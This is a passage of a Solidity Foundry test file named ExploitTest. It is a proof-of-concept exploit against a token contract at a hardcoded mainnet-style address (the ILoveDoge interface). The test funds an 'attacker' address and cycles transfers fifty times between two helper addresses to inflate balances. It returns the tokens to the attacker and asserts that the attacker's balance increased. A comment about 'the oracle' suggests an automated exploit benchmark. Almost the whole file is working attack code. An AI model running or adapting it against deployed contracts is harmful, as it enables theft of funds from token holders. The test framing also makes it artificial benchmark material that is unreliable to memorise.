    function transfer(address recipient, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
}

interface ILoveDoge {
    function totalSupply() external view returns (uint256);
    function totalBurn() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────


    address constant TARGET = 0x7144E379C827fA71A7ecAA01d00607cBb7eB1b7A;
    address attacker = address(this);

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // Create a helper address
        address helper = address(0x123);

        // Ensure attacker has some tokens to start with
        deal(TARGET, attacker, 1000 * 10**9);

        // Ensure attacker is not admin (should be false by default)
        // No need to do anything as adminAddress[attacker] should be false
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Create helper addresses
        address helper1 = address(0x123);
        address helper2 = address(0x456);

        // Get initial attacker balance
        uint256 initialBalance = IERC20(TARGET).balanceOf(attacker);

        // Transfer some tokens to helper1 to start
        uint256 startAmount = 500 * 10**9;
        IERC20(TARGET).transfer(helper1, startAmount);

        // Now transfer between helper1 and helper2 many times
        uint256 transferAmount = 100 * 10**9;

        for (uint i = 0; i < 50; i++) {
            // Transfer from helper1 to helper2
            vm.prank(helper1);
            IERC20(TARGET).transfer(helper2, transferAmount);

            // Transfer from helper2 to helper1
            vm.prank(helper2);
            IERC20(TARGET).transfer(helper1, transferAmount);
        }

        // Finally, transfer all tokens back to attacker
        uint256 helper1Balance = IERC20(TARGET).balanceOf(helper1);
        vm.prank(helper1);
        IERC20(TARGET).transfer(attacker, helper1Balance);

        uint256 helper2Balance = IERC20(TARGET).balanceOf(helper2);
        vm.prank(helper2);
        IERC20(TARGET).transfer(attacker, helper2Balance);

        // Check final balance
        uint256 finalBalance = IERC20(TARGET).balanceOf(attacker);

        // The oracle will check if attacker balance increased
        assertGt(finalBalance, initialBalance, "Attacker balance should have increased");
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}
